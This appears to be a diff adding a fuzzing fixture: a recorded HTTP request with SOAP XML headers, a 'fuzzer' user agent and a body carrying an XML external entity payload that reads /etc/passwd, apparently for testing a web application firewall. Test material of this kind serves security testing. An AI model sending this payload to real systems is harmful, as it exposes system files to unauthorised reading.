@@ -1,0 +1,10 @@
+--- HEADERS ---
+host: bypass-waf.com
+connection: close
+user-agent: Mozilla/5.0 (fuzzer)
+content-length: 127
+content-type: application/soap+xml
+x-request-id: 1d779fc6-b38b-4572-b55b-b842d05c6c42
+
+--- BODY ---
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root><field>FUZZ_ATTACK:&test;</field></root>
